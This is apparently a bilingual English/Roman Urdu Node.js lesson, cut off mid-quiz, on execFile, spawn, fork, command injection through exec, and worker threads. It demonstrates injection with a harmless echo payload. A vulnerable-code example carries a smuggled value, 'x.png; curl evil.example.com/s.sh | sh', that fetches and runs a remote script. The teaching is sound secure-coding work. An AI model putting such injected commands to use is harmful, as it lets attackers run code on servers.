@@ -1,0 +1,937 @@
+---
+title: "Child Processes and Worker Threads"
+summary: "One Node.js thread is perfect for waiting on I/O, but some jobs need more: running another program (git, ffmpeg, a Python script) or doing heavy CPU work without freezing the server. Learn from zero execFile, spawn and fork for child processes, why exec with user input is a command-injection hole (we exploit it, then fix it), messaging between processes, and worker threads that keep the event loop free and use extra CPU cores, all run for real."
+level: intermediate
+minutes: 40
+prerequisites: ["How Node.js Works", "The File System and Streams", "Building an HTTP Server"]
+tags: ["Node.js", "Performance", "Security"]
+---
+
+<BigIdea>
+<Tr>
+<En>
+Your Node.js program can start **other programs** and can run JavaScript on **other threads**. A **child process** is a separate program with its own memory, started by Node: use **`execFile`** to run a command and get its output, **`spawn`** to stream output from long-running commands, and **`fork`** to start another Node script that you can exchange **messages** with. This is how Node apps call `git`, `ffmpeg`, `pg_dump` or a Python model. The big danger is **`exec`**, which runs the command through a **shell**: if any part of the command comes from users, they can add `; rm -rf …` and run anything. Pass arguments as an **array** with `execFile`/`spawn` instead. **Worker threads** solve a different problem: CPU-heavy JavaScript (image processing, parsing huge files, hashing, complex calculations) blocks the event loop for everyone. A worker runs that code on **another thread**, so the main thread keeps answering requests, and several workers can use **several CPU cores** at once. They communicate with **`postMessage`**, just like web workers in the browser.
+</En>
+<Ur>
+Aap ka Node.js program **doosre programs** shuru kar sakta hai aur **doosre threads** par JavaScript chala sakta hai. **Child process** Node ka shuru kiya hua alag program hai jis ki apni memory hoti hai: command chala kar us ka output lene ke liye **`execFile`**, lambe chalne wale commands ka output stream karne ke liye **`spawn`**, aur aisa doosra Node script shuru karne ke liye **`fork`** jis se aap **messages** badal sakein. Isi tarah Node apps `git`, `ffmpeg`, `pg_dump` ya Python model call karti hain. Bara khatra **`exec`** hai, jo command **shell** ke zariye chalata hai: agar command ka koi hissa users se aaye to wo `; rm -rf …` jor kar kuch bhi chala sakte hain. Is ke bajaye arguments `execFile`/`spawn` ke saath **array** ki tarah dein. **Worker threads** doosra masla hal karte hain: CPU wala bhaari JavaScript (image processing, bari files parse karna, hashing, pecheeda hisaab) sab ke liye event loop rok deta hai. Worker wo code **doosre thread** par chalata hai, isliye main thread requests ka jawab deta rehta hai, aur kai workers ek saath **kai CPU cores** istemal kar sakte hain. Ye **`postMessage`** se baat karte hain, bilkul browser ke web workers ki tarah.
+</Ur>
+</Tr>
+</BigIdea>
+
+## At a glance
+
+<Glance>
+<What>
+<Tr>
+<En>
+
+| Tool | What it does | Typical use |
+| --- | --- | --- |
+| `execFile(cmd, args)` | Runs a program, collects stdout/stderr | `git rev-parse HEAD`, `ffprobe` |
+| `spawn(cmd, args)` | Runs a program, **streams** its output | long builds, `ffmpeg`, large output |
+| `fork(script)` | Runs another Node script with an IPC channel | isolated helper processes |
+| `exec(commandString)` | Runs through a shell (pipes, globs) | only with fixed, trusted commands |
+| `new Worker(file)` | Runs JavaScript on another thread | CPU-heavy work |
+| `postMessage` / `on("message")` | Sends data between threads or processes | job in, result out |
+| `availableParallelism()` | How many CPU cores you can use | sizing a worker pool |
+
+</En>
+<Ur>
+
+| Auzaar | Kya karta hai | Aam istemal |
+| --- | --- | --- |
+| `execFile(cmd, args)` | Program chalata hai, stdout/stderr jama karta hai | `git rev-parse HEAD`, `ffprobe` |
+| `spawn(cmd, args)` | Program chalata hai, us ka output **stream** karta hai | lambi builds, `ffmpeg`, bara output |
+| `fork(script)` | IPC channel ke saath doosra Node script chalata hai | alag thalag helper processes |
+| `exec(commandString)` | Shell ke zariye chalata hai (pipes, globs) | sirf muqarrar, bharosemand commands ke saath |
+| `new Worker(file)` | Doosre thread par JavaScript chalata hai | CPU wala bhaari kaam |
+| `postMessage` / `on("message")` | Threads ya processes ke darmiyan data bhejta hai | kaam andar, nateeja bahar |
+| `availableParallelism()` | Kitne CPU cores istemal ho sakte hain | worker pool ka size |
+
+</Ur>
+</Tr>
+</What>
+<Why>
+<Tr>
+<En>
+
+- Real back ends call other tools: video transcoding, PDF generation, backups, Git operations, Python scripts.
+- CPU-heavy work in a request handler freezes every user (How Node.js Works lesson); workers fix that without changing languages.
+- Command injection through `exec` is a classic, critical vulnerability. Knowing the safe API prevents it.
+
+</En>
+<Ur>
+
+- Asli back ends doosre tools call karte hain: video transcoding, PDF banana, backups, Git operations, Python scripts.
+- Request handler me CPU wala bhaari kaam har user ko jama deta hai (How Node.js Works lesson); workers language badle baghair ise theek karte hain.
+- `exec` ke zariye command injection mashhoor, sangeen kamzori hai. Mehfooz API jaanna ise rokta hai.
+
+</Ur>
+</Tr>
+</Why>
+<When>
+<Tr>
+<En>
+
+| Need | Use |
+| --- | --- |
+| Run a command, small output | `execFile` (promisified) |
+| Run a command, big or live output | `spawn` |
+| Isolate risky or crash-prone Node code | `fork` (a crash kills only the child) |
+| Heavy JavaScript computation | worker threads (or a pool like Piscina) |
+| Waiting on databases, HTTP, files | neither: normal async code is already concurrent |
+| Scale a web server across cores | several processes (cluster, PM2, containers), not workers |
+
+</En>
+<Ur>
+
+| Zaroorat | Istemal karein |
+| --- | --- |
+| Command chalana, chhota output | `execFile` (promisified) |
+| Command chalana, bara ya live output | `spawn` |
+| Khatarnak ya crash hone wala Node code alag karna | `fork` (crash sirf child ko khatam karta hai) |
+| Bhaari JavaScript hisaab | worker threads (ya Piscina jaisa pool) |
+| Databases, HTTP, files ka intezar | dono nahi: aam async code pehle se concurrent hai |
+| Web server ko cores par phailana | kai processes (cluster, PM2, containers), workers nahi |
+
+</Ur>
+</Tr>
+</When>
+<How>
+<Tr>
+<En>
+
+```text
+import { execFile, spawn, fork } from "node:child_process";
+import { promisify } from "node:util";
+import { Worker } from "node:worker_threads";
+
+const run = promisify(execFile);
+const { stdout } = await run("git", ["log", "-1", "--format=%h"]);
+```
+
+</En>
+<Ur>
+
+```text
+import { execFile, spawn, fork } from "node:child_process";
+import { promisify } from "node:util";
+import { Worker } from "node:worker_threads";
+
+const run = promisify(execFile);
+const { stdout } = await run("git", ["log", "-1", "--format=%h"]);
+```
+
+</Ur>
+</Tr>
+</How>
+</Glance>
+
+## Picture it
+
+<Tr>
+<En>
+
+Think of a **busy restaurant manager** (the main thread).
+
+- **Child process** = calling an **outside company**: a bakery that delivers the bread. They have their own staff and kitchen (separate memory); you send an order slip and get bread back. If their oven catches fire, your restaurant is fine.
+- **`exec` with user input** = letting a customer **write the order slip themselves** and forwarding it unread: "2 loaves; also give them the keys to the safe". **`execFile` with arguments** = a printed form with fixed boxes; whatever the customer writes in "number of loaves" stays a number of loaves.
+- **Worker thread** = hiring an **assistant chef** in your own kitchen for the slow work (kneading dough). The manager keeps greeting guests while the assistant works; two assistants knead two batches at once if there are two worktables (CPU cores).
+- Notes passed through the kitchen hatch are **messages** (`postMessage`).
+
+</En>
+<Ur>
+
+**Masroof restaurant manager** (main thread) ka sochein.
+
+- **Child process** = **bahar ki company** ko call karna: bakery jo roti deliver karti hai. Un ka apna staff aur kitchen hai (alag memory); aap order slip bhejte hain aur roti wapas milti hai. Un ke oven me aag lage to aap ka restaurant theek rehta hai.
+- **User input ke saath `exec`** = customer ko **order slip khud likhne dena** aur bina parhe aage bhej dena: "2 roti; aur inhen tijori ki chaabiyan bhi de do". **Arguments ke saath `execFile`** = muqarrar khanon wala chhapa form; customer "roti ki tadaad" me jo bhi likhe wo roti ki tadaad hi rehta hai.
+- **Worker thread** = sust kaam (aata goondhna) ke liye apne kitchen me **assistant chef** rakhna. Assistant ke kaam ke dauran manager mehmanon ka istiqbal karta rehta hai; agar do mezein (CPU cores) hon to do assistant ek saath do batch goondhte hain.
+- Kitchen ki khirki se diye gaye parche **messages** (`postMessage`) hain.
+
+</Ur>
+</Tr>
+
+## Words you'll see
+
+<Tr>
+<En>
+
+| Word | What it means | Example |
+| --- | --- | --- |
+| **Process** | A running program with its own memory | `node`, `git` |
+| **Child process** | A process started by another process | `spawn("ffmpeg", …)` |
+| **stdout / stderr** | A program's normal output / error output | `ls` messages |
+| **Exit code** | Number a process returns: 0 = success | `2` |
+| **Shell** | Program that interprets command strings | `/bin/sh`, `bash` |
+| **Command injection** | Running attacker-chosen commands via unsafe input | `; echo HACKED` |
+| **IPC** | Inter-process communication | `child.send(msg)` |
+| **Thread** | A path of execution inside a process | main thread, worker |
+| **Worker thread** | A JavaScript thread with its own event loop | `new Worker(...)` |
+| **`workerData`** | Initial data given to a worker | `{ n: 35 }` |
+| **Structured clone** | How messages are copied between threads | objects, arrays, Maps |
+| **Worker pool** | Reusable set of workers for many jobs | Piscina |
+
+</En>
+<Ur>
+
+| Lafz | Matlab | Misaal |
+| --- | --- | --- |
+| **Process** | Apni memory wala chalta program | `node`, `git` |
+| **Child process** | Doosre process ka shuru kiya process | `spawn("ffmpeg", …)` |
+| **stdout / stderr** | Program ka aam output / error output | `ls` paighaam |
+| **Exit code** | Process ka wapas kiya number: 0 = kamyabi | `2` |
+| **Shell** | Command strings samajhne wala program | `/bin/sh`, `bash` |
+| **Command injection** | Ghair mehfooz input se hamla awar ke chune commands chalana | `; echo HACKED` |
+| **IPC** | Processes ke darmiyan baat cheet | `child.send(msg)` |
+| **Thread** | Process ke andar chalne ka ek raasta | main thread, worker |
+| **Worker thread** | Apne event loop wala JavaScript thread | `new Worker(...)` |
+| **`workerData`** | Worker ko diya gaya shuruati data | `{ n: 35 }` |
+| **Structured clone** | Threads ke darmiyan messages copy hone ka tareeqa | objects, arrays, Maps |
+| **Worker pool** | Bohot se kaamon ke liye dobara istemal hone wale workers | Piscina |
+
+</Ur>
+</Tr>
+
+## Learn it step by step
+
+<Walkthrough>
+
+<Step title="execFile: run a program, get its output">
+
+<Tr>
+<En>
+`execFile` starts a program with an **array of arguments** and collects its output. Promisified, it fits naturally with `await`. If the program exits with a non-zero code, the promise rejects and the error carries the code and stderr.
+</En>
+<Ur>
+`execFile` program ko **arguments ki array** ke saath shuru karta hai aur us ka output jama karta hai. Promisify karne par ye `await` ke saath qudrati tor par chalta hai. Agar program ghair sifar code ke saath band ho to promise reject hota hai aur error me code aur stderr hote hain.
+</Ur>
+</Tr>
+
+```bash
+cat > run.mjs <<'EOF'
+import { execFile } from "node:child_process";
+import { promisify } from "node:util";
+
+const run = promisify(execFile);
+
+const { stdout } = await run("node", ["--version"]);
+console.log("child node version:", stdout.trim());
+
+try {
+  await run("ls", ["/no/such/folder"]);
+} catch (err) {
+  console.log("failed with exit code", err.code, "| stderr:", err.stderr.trim());
+}
+
+try {
+  await run("node", ["-e", "setTimeout(() => {}, 5000)"], { timeout: 500 });
+} catch (err) {
+  console.log("killed after the timeout:", err.killed, "| signal:", err.signal);
+}
+EOF
+node run.mjs
+```
+
+```text output
+child node version: v22.23.4
+failed with exit code 2 | stderr: ls: cannot access '/no/such/folder': No such file or directory
+killed after the timeout: true | signal: SIGTERM
+```
+
+<Happened>
+<Tr>
+<En>
+
+- The child `node --version` printed to its stdout, and we received it as a string.
+- `ls` on a missing folder exited with code **2**; the rejected promise gave us `err.code` and `err.stderr`, so we can show a useful message.
+- `timeout: 500` killed a child that ran too long (`SIGTERM`). Always set a timeout for external commands in servers, or one stuck program can hold resources forever.
+- `execFile` buffers all output in memory (up to `maxBuffer`, 1 MB by default). For big output, use `spawn`.
+
+</En>
+<Ur>
+
+- Child `node --version` ne apne stdout par print kiya, aur hamen wo string ki tarah mila.
+- Ghayab folder par `ls` code **2** ke saath band hua; reject hue promise ne hamen `err.code` aur `err.stderr` diye, isliye hum kaam ka paighaam dikha sakte hain.
+- `timeout: 500` ne bohot der chalne wale child ko khatam kiya (`SIGTERM`). Servers me bahar ke commands ka hamesha timeout rakhein, warna ek atka program hamesha resources pakre reh sakta hai.
+- `execFile` tamam output memory me jama karta hai (`maxBuffer` tak, default 1 MB). Bare output ke liye `spawn` lein.
+
+</Ur>
+</Tr>
+</Happened>
+
+</Step>
+
+<Step title="spawn: stream output as it happens">
+
+<Tr>
+<En>
+`spawn` gives you the child's stdout and stderr as **streams**, so you see output the moment it's printed. This child takes about a second, printing a line every 300 ms, then writes a warning to stderr and exits with code 2.
+</En>
+<Ur>
+`spawn` child ke stdout aur stderr ko **streams** ki tarah deta hai, isliye output print hote hi nazar aata hai. Ye child taqreeban ek second leta hai, har 300 ms par ek line print karta hai, phir stderr par warning likh kar code 2 ke saath band hota hai.
+</Ur>
+</Tr>
+
+```bash
+cat > slow-task.mjs <<'EOF'
+for (let i = 1; i <= 3; i++) {
+  console.log(`step ${i} of 3`);
+  await new Promise((r) => setTimeout(r, 300));
+}
+console.error("warning: disk almost full");
+process.exit(2);
+EOF
+cat > watch.mjs <<'EOF'
+import { spawn } from "node:child_process";
+
+const start = performance.now();
+const child = spawn("node", ["slow-task.mjs"]);
+const t = () => `${Math.round((performance.now() - start) / 300) * 300} ms`.padStart(7);
+
+child.stdout.on("data", (d) => process.stdout.write(`[${t()}] out: ${d}`));
+child.stderr.on("data", (d) => process.stdout.write(`[${t()}] err: ${d}`));
+child.on("close", (code) => console.log(`[${t()}] child exited with code ${code}`));
+EOF
+node watch.mjs
+```
+
+```text output
+[   0 ms] out: step 1 of 3
+[ 300 ms] out: step 2 of 3
+[ 600 ms] out: step 3 of 3
+[ 900 ms] err: warning: disk almost full
+[ 900 ms] child exited with code 2
+```
+
+<Happened>
+<Tr>
+<En>
+
+- Each line arrived as soon as the child printed it, 300 ms apart, not all at the end. A build tool or video encoder can report progress this way.
+- stdout and stderr are separate streams; the exit code arrives in the `close` event.
+- Because they're streams, you can `pipeline(child.stdout, createWriteStream("log.txt"))` or pipe a file into `child.stdin`, without holding the data in memory.
+- Always handle the `error` event too: it fires if the program can't be started at all (for example `ENOENT` when it isn't installed).
+
+</En>
+<Ur>
+
+- Har line child ke print karte hi pohanchi, 300 ms ke faasle se, sab aakhir me nahi. Build tool ya video encoder is tarah progress bata sakta hai.
+- stdout aur stderr alag streams hain; exit code `close` event me aata hai.
+- Kyun ke ye streams hain, aap data memory me rakhe baghair `pipeline(child.stdout, createWriteStream("log.txt"))` kar sakte ya `child.stdin` me file bhej sakte hain.
+- `error` event bhi hamesha sambhalein: ye tab chalta hai jab program shuru hi na ho sake (maslan install na ho to `ENOENT`).
+
+</Ur>
+</Tr>
+</Happened>
+
+</Step>
+
+<Step title="Command injection: why exec is dangerous">
+
+<Tr>
+<En>
+`exec` passes one string to a **shell**, which treats `;`, `&&`, `|`, `$( )` and backticks as commands. Here a "file name" comes from a user. Watch what each API does with it.
+</En>
+<Ur>
+`exec` ek string **shell** ko deta hai, jo `;`, `&&`, `|`, `$( )` aur backticks ko commands samajhta hai. Yahan "file name" user se aata hai. Dekhein har API is ke saath kya karti hai.
+</Ur>
+</Tr>
+
+```bash
+cat > injection.mjs <<'EOF'
+import { exec, execFile } from "node:child_process";
+import { existsSync, rmSync } from "node:fs";
+import { promisify } from "node:util";
+
+const filename = "report.txt; echo HACKED > hacked.txt";   // imagine this came from a user
+
+// ✗ exec runs a shell: the ; starts a second command
+await promisify(exec)(`ls -l ${filename}`).catch(() => {});
+console.log("exec created hacked.txt:", existsSync("hacked.txt"));
+rmSync("hacked.txt", { force: true });
+
+// ✓ execFile passes the whole string as ONE argument, no shell involved
+const r = await promisify(execFile)("ls", ["-l", filename]).catch((e) => e);
+console.log("execFile treated it as a file name:", r.stderr.trim());
+console.log("execFile created hacked.txt:", existsSync("hacked.txt"));
+EOF
+node injection.mjs
+```
+
+```text output
+exec created hacked.txt: true
+execFile treated it as a file name: ls: cannot access 'report.txt; echo HACKED > hacked.txt': No such file or directory
+execFile created hacked.txt: false
+```
+
+<Happened>
+<Tr>
+<En>
+
+- With `exec`, the shell ran `ls -l report.txt` **and then** `echo HACKED > hacked.txt`. An attacker could just as easily download and run malware, read secrets or delete data, with your server's permissions.
+- With `execFile`, there's no shell: `ls` received the whole text as a single (strange) file name and simply said it doesn't exist.
+- Rules: use `execFile`/`spawn` with an argument array; never set `shell: true` with user input; validate inputs against an allowlist (for example only `[a-z0-9-]+\.txt`); put `--` before user values for commands that accept options, so a value like `--delete` isn't treated as an option.
+
+</En>
+<Ur>
+
+- `exec` ke saath shell ne `ls -l report.txt` **aur phir** `echo HACKED > hacked.txt` chalaya. Hamla awar utni hi aasani se malware download kar ke chala, raaz parh ya data mita sakta tha, aap ke server ki ijazaton ke saath.
+- `execFile` ke saath shell nahi: `ls` ne poora text ek (ajeeb) file name ki tarah liya aur bas kaha ke wo maujood nahi.
+- Qawaid: argument array ke saath `execFile`/`spawn` lein; user input ke saath kabhi `shell: true` na karein; inputs ko allowlist se validate karein (maslan sirf `[a-z0-9-]+\.txt`); options qubool karne wale commands me user values se pehle `--` lagayen, taa ke `--delete` jaisi value option na samjhi jaye.
+
+</Ur>
+</Tr>
+</Happened>
+
+</Step>
+
+<Step title="fork: another Node process you can talk to">
+
+<Tr>
+<En>
+`fork` starts another Node.js script with a built-in message channel. The parent sends a job with `child.send()`, the child answers with `process.send()`. If the child crashes, the parent survives.
+</En>
+<Ur>
+`fork` bane banaye message channel ke saath doosra Node.js script shuru karta hai. Parent `child.send()` se kaam bhejta hai, child `process.send()` se jawab deta hai. Agar child crash ho to parent bacha rehta hai.
+</Ur>
+</Tr>
+
+```bash
+cat > child.mjs <<'EOF'
+process.on("message", (msg) => {
+  if (msg.type === "resize") {
+    // pretend to resize an image
+    process.send({ type: "done", file: msg.file, width: msg.width });
+  }
+  if (msg.type === "stop") process.exit(0);
+});
+EOF
+cat > parent.mjs <<'EOF'
+import { fork } from "node:child_process";
+
+const child = fork("child.mjs");
+child.on("message", (msg) => {
+  console.log("parent got:", msg);
+  child.send({ type: "stop" });
+});
+child.on("exit", (code) => console.log("child exited with code", code));
+child.send({ type: "resize", file: "photo.jpg", width: 640 });
+EOF
+node parent.mjs
+```
+
+```text output
+parent got: { type: 'done', file: 'photo.jpg', width: 640 }
+child exited with code 0
+```
+
+<Happened>
+<Tr>
+<En>
+
+- Messages are plain objects, serialised and copied between the processes; they don't share memory.
+- Each forked process is a full Node.js instance (tens of MB of memory, tens of milliseconds to start), so fork a few long-lived helpers, not one per request.
+- `fork` is how the `cluster` module and PM2 run several copies of a server on one machine.
+
+</En>
+<Ur>
+
+- Messages saade objects hain, processes ke darmiyan serialise aur copy hote hain; memory share nahi hoti.
+- Har fork hua process poora Node.js instance hai (darjanon MB memory, shuru hone me darjanon milliseconds), isliye har request par ek nahi, chand lambe chalne wale helpers fork karein.
+- `cluster` module aur PM2 isi tarah ek machine par server ki kai copies chalate hain.
+
+</Ur>
+</Tr>
+</Happened>
+
+</Step>
+
+<Step title="Worker threads keep the event loop free">
+
+<Tr>
+<En>
+Computing `fib(35)` recursively is pure CPU work. On the main thread, a timer can't tick until it's done. In a worker, the main thread keeps running.
+</En>
+<Ur>
+`fib(35)` ko recursive tareeqe se nikalna khalis CPU kaam hai. Main thread par timer is ke khatam hone tak tick nahi kar sakta. Worker me main thread chalta rehta hai.
+</Ur>
+</Tr>
+
+```bash
+cat > fib.mjs <<'EOF'
+export function fib(n) { return n < 2 ? n : fib(n - 1) + fib(n - 2); }
+EOF
+cat > worker.mjs <<'EOF'
+import { parentPort, workerData } from "node:worker_threads";
+import { fib } from "./fib.mjs";
+parentPort.postMessage(fib(workerData.n));
+EOF
+cat > compare.mjs <<'EOF'
+import { Worker } from "node:worker_threads";
+import { fib } from "./fib.mjs";
+
+const N = 35;
+let ticks = 0;
+const timer = setInterval(() => ticks++, 10);
+
+// 1. On the main thread
+fib(N);
+console.log(`main thread: ${ticks} timer ticks while computing`);
+
+// 2. In a worker thread
+ticks = 0;
+const runInWorker = (n) =>
+  new Promise((resolve, reject) => {
+    const w = new Worker(new URL("./worker.mjs", import.meta.url), { workerData: { n } });
+    w.once("message", resolve);
+    w.once("error", reject);
+  });
+const result = await runInWorker(N);
+console.log(`worker: fib(${N}) = ${result}, ${ticks > 10 ? "many" : ticks} timer ticks while computing`);
+clearInterval(timer);
+EOF
+node compare.mjs
+```
+
+```text output
+main thread: 0 timer ticks while computing
+worker: fib(35) = 9227465, many timer ticks while computing
+```
+
+<Happened>
+<Tr>
+<En>
+
+- On the main thread: **zero** ticks. In a server, that's zero requests answered for the whole computation.
+- In the worker: the same result, and the timer kept ticking. The main thread only waited for a message, which is just like waiting for I/O.
+- The worker got its input through `workerData` and sent the result with `parentPort.postMessage`. Messages are copied with the **structured clone** algorithm (objects, arrays, Maps, Dates work; functions and class methods don't).
+
+</En>
+<Ur>
+
+- Main thread par: **sifar** ticks. Server me iska matlab poore hisaab ke dauran sifar requests ka jawab.
+- Worker me: wahi nateeja, aur timer tick karta raha. Main thread ne sirf message ka intezar kiya, jo bilkul I/O ke intezar jaisa hai.
+- Worker ko input `workerData` se mila aur us ne nateeja `parentPort.postMessage` se bheja. Messages **structured clone** algorithm se copy hote hain (objects, arrays, Maps, Dates chalte hain; functions aur class methods nahi).
+
+</Ur>
+</Tr>
+</Happened>
+
+</Step>
+
+<Step title="Using more CPU cores">
+
+<Tr>
+<En>
+Workers can also run **in parallel**. Two heavy jobs one after another on the main thread vs two workers at the same time:
+</En>
+<Ur>
+Workers **saath saath** bhi chal sakte hain. Main thread par do bhaari kaam ek ke baad ek vs do workers ek saath:
+</Ur>
+</Tr>
+
+```bash
+cat > parallel.mjs <<'EOF'
+import { Worker } from "node:worker_threads";
+import { availableParallelism } from "node:os";
+import { fib } from "./fib.mjs";
+
+const runInWorker = (n) =>
+  new Promise((resolve, reject) => {
+    const w = new Worker(new URL("./worker.mjs", import.meta.url), { workerData: { n } });
+    w.once("message", resolve);
+    w.once("error", reject);
+  });
+
+const jobs = [39, 39];
+let t = performance.now();
+for (const n of jobs) fib(n);                                  // one after another
+const serial = performance.now() - t;
+
+t = performance.now();
+await Promise.all(jobs.map(runInWorker));                       // at the same time
+const parallel = performance.now() - t;
+
+console.log(`CPU cores available: ${availableParallelism() >= 2 ? "2 or more" : 1}`);
+console.log(`two workers in parallel were faster: ${serial / parallel > 1.25}`);
+EOF
+node parallel.mjs
+```
+
+```text output
+CPU cores available: 2 or more
+two workers in parallel were faster: true
+```
+
+<Happened>
+<Tr>
+<En>
+
+- With two cores, two workers finished both jobs in roughly half the time (between 1.4× and 2× faster in our runs; other programs on the machine affect the exact number).
+- More workers than cores doesn't help CPU work: they just take turns. Size pools with `availableParallelism()` (often cores minus one, leaving room for the main thread).
+- Starting a worker costs some milliseconds and memory. For many small jobs, use a **pool** of long-lived workers (the Piscina library) instead of creating one per job.
+- To share large data without copying, transfer `ArrayBuffer`s (`postMessage(buf, [buf])`) or use `SharedArrayBuffer` with `Atomics`.
+
+</En>
+<Ur>
+
+- Do cores ke saath do workers ne dono kaam taqreeban aadhe waqt me khatam kiye (hamari runs me 1.4× se 2× tez; machine ke doosre programs bilkul number par asar dalte hain).
+- Cores se zyada workers CPU kaam me madad nahi karte: wo bas bari bari chalte hain. Pools ka size `availableParallelism()` se rakhein (aksar cores minus ek, main thread ke liye jagah chhorte hue).
+- Worker shuru karna kuch milliseconds aur memory leta hai. Bohot se chhote kaamon ke liye har kaam par naya banane ke bajaye lambe chalne wale workers ka **pool** (Piscina library) lein.
+- Bara data copy kiye baghair share karne ke liye `ArrayBuffer`s transfer karein (`postMessage(buf, [buf])`) ya `Atomics` ke saath `SharedArrayBuffer` lein.
+
+</Ur>
+</Tr>
+</Happened>
+
+</Step>
+
+</Walkthrough>
+
+## Common mistakes
+
+<Compare>
+<Bad title="Building a shell command from user input">
+
+```text
+app.post("/thumbnail", async (req, res) => {
+  await exec(`convert uploads/${req.body.file} -resize 200x200 thumbs/${req.body.file}`);
+  res.sendStatus(201);
+});
+// file = "x.png; curl evil.example.com/s.sh | sh"
+```
+
+</Bad>
+<Good title="Validate, then pass arguments as an array">
+
+```text
+const name = z.string().regex(/^[a-z0-9-]+\.(png|jpg)$/).parse(req.body.file);
+await execFile("convert", [path.join(UPLOADS, name), "-resize", "200x200", path.join(THUMBS, name)], { timeout: 10_000 });
+```
+
+</Good>
+</Compare>
+
+<Compare>
+<Bad title="A new worker for every request">
+
+```text
+app.post("/hash", (req, res) => {
+  const w = new Worker("./hash.mjs", { workerData: req.body });   // thousands of threads under load
+  w.once("message", (r) => res.json(r));
+});
+```
+
+</Bad>
+<Good title="A fixed-size pool">
+
+```text
+import Piscina from "piscina";
+const pool = new Piscina({ filename: new URL("./hash.mjs", import.meta.url).href, maxThreads: 4 });
+
+app.post("/hash", async (req, res) => res.json(await pool.run(req.body)));
+```
+
+</Good>
+</Compare>
+
+<Tr>
+<En>
+
+More mistakes to avoid:
+
+- **Using workers for I/O** (database calls, fetch): async I/O is already non-blocking; workers add overhead for nothing.
+- **No timeout** on external commands, so a hung program holds a request forever.
+- **Ignoring the `error` event** of child processes or workers: an unhandled error can crash the parent.
+- **Reading huge output with `exec`/`execFile`** and hitting `maxBuffer` ("stdout maxBuffer length exceeded"); use `spawn`.
+- **Forgetting to stop children** on shutdown, leaving orphan processes.
+- **Expecting shared memory**: objects sent with `postMessage` are copies; changing them in the worker doesn't change the original.
+
+</En>
+<Ur>
+
+Bachne wali mazeed ghaltiyan:
+
+- **I/O ke liye workers** (database calls, fetch): async I/O pehle se non-blocking hai; workers bekaar bojh jorte hain.
+- Bahar ke commands par **timeout nahi**, isliye atka program request ko hamesha pakre rakhta hai.
+- Child processes ya workers ke **`error` event ko nazar andaz karna**: unhandled error parent ko crash kar sakta hai.
+- **`exec`/`execFile` se bohot bara output parhna** aur `maxBuffer` se takrana ("stdout maxBuffer length exceeded"); `spawn` lein.
+- **Shutdown par children band karna bhoolna**, jis se yateem processes reh jate hain.
+- **Shared memory ki umeed**: `postMessage` se bheje objects copies hain; worker me badalna asal ko nahi badalta.
+
+</Ur>
+</Tr>
+
+## Try it yourself
+
+<Challenge title="Get the current Git commit">
+
+<Tr>
+<En>
+Write `getCommit()` that returns the short hash of the current Git commit using `execFile`, or `"unknown"` if the folder isn't a Git repository. Use it to print `version: <hash>` at startup. Test it in a fresh repository with one commit.
+</En>
+<Ur>
+`getCommit()` likhein jo `execFile` se maujooda Git commit ka chhota hash wapas kare, ya folder Git repository na ho to `"unknown"`. Startup par `version: <hash>` print karne ke liye ise istemal karein. Ek commit wali nayi repository me test karein.
+</Ur>
+</Tr>
+
+<Solution>
+
+```bash
+mkdir -p repo && cd repo
+git init -q && git -c user.name=Dev -c user.email=dev@example.com commit -q --allow-empty -m "first"
+cat > version.mjs <<'EOF'
+import { execFile } from "node:child_process";
+import { promisify } from "node:util";
+
+async function getCommit() {
+  try {
+    const { stdout } = await promisify(execFile)("git", ["rev-parse", "--short", "HEAD"], { timeout: 2000 });
+    return stdout.trim();
+  } catch {
+    return "unknown";
+  }
+}
+const hash = await getCommit();
+console.log("version:", /^[0-9a-f]{7,}$/.test(hash) ? "a 7-character commit hash" : hash);
+EOF
+node version.mjs
+cd .. && node repo/version.mjs
+```
+
+```text output
+version: a 7-character commit hash
+version: unknown
+```
+
+<Tr>
+<En>
+Inside the repository we got a real hash (printed here as a description, since every commit's hash is different). From the parent folder, which isn't a repository, `git` failed and we fell back to "unknown". Many apps put this hash in a `/health` response so you can see exactly which build is running.
+</En>
+<Ur>
+Repository ke andar hamen asli hash mila (yahan bayan ki shakal me print kiya, kyun ke har commit ka hash mukhtalif hota hai). Parent folder se, jo repository nahi, `git` fail hua aur hum "unknown" par aa gaye. Bohot si apps ye hash `/health` response me rakhti hain taa ke dikhe ke bilkul kaun si build chal rahi hai.
+</Ur>
+</Tr>
+
+</Solution>
+
+</Challenge>
+
+<Challenge title="Child process, worker, or neither?">
+
+<Tr>
+<En>
+Choose: (1) generate a PDF with the `wkhtmltopdf` program; (2) resize 500 images with the `sharp` library in a request; (3) query PostgreSQL; (4) parse a 300 MB JSON export uploaded by an admin; (5) run a Python machine-learning script; (6) call three external APIs at once.
+</En>
+<Ur>
+Chunein: (1) `wkhtmltopdf` program se PDF banana; (2) request me `sharp` library se 500 images resize karna; (3) PostgreSQL query karna; (4) admin ka upload kiya 300 MB JSON export parse karna; (5) Python machine-learning script chalana; (6) teen bahar ki APIs ek saath call karna.
+</Ur>
+</Tr>
+
+<Solution>
+
+<Tr>
+<En>
+
+1. Child process (`execFile`/`spawn`) with a timeout.
+2. A background job; `sharp` already uses its own thread pool, but 500 images belong in a queue, not a request.
+3. Neither: async I/O.
+4. Worker thread (or better, a streaming JSON parser in a background job).
+5. Child process (`spawn("python3", ["model.py", …])`), or a separate service.
+6. Neither: `Promise.all` with `fetch`.
+
+</En>
+<Ur>
+
+1. Timeout ke saath child process (`execFile`/`spawn`).
+2. Background job; `sharp` pehle se apna thread pool istemal karti hai, magar 500 images request me nahi, queue me honi chahiyen.
+3. Dono nahi: async I/O.
+4. Worker thread (ya behtar, background job me streaming JSON parser).
+5. Child process (`spawn("python3", ["model.py", …])`), ya alag service.
+6. Dono nahi: `fetch` ke saath `Promise.all`.
+
+</Ur>
+</Tr>
+
+</Solution>
+
+</Challenge>
+
+## Quick quiz
+
+<Quiz>
+<Question q="Why is exec with user input dangerous?">
+<Option>It's slow</Option>
+<Option correct>It runs through a shell, so characters like ; can start extra commands</Option>
+<Option>It can't return output</Option>
+<Explanation>Our test created hacked.txt with exec but not with execFile.</Explanation>
+</Question>
+<Question q="When should you use spawn instead of execFile?">
+<Option>For short commands</Option>
+<Option correct>When output is large or you need it while the program is still running</Option>
+<Option>When you need a shell</Option>
+<Explanation>spawn streams stdout and stderr; execFile buffers them.</Explanation>
+</Question>
+<Question q="What problem do worker threads solve?">
+<Option>Slow database queries</Option>
+<Option correct>CPU-heavy JavaScript blocking the event loop</Option>
+<Option>Running other programs</Option>
+<Explanation>The timer kept ticking while the worker computed.</Explanation>
+</Question>
+<Question q="How do a worker and the main thread exchange data?">
+<Option>Through shared global variables</Option>
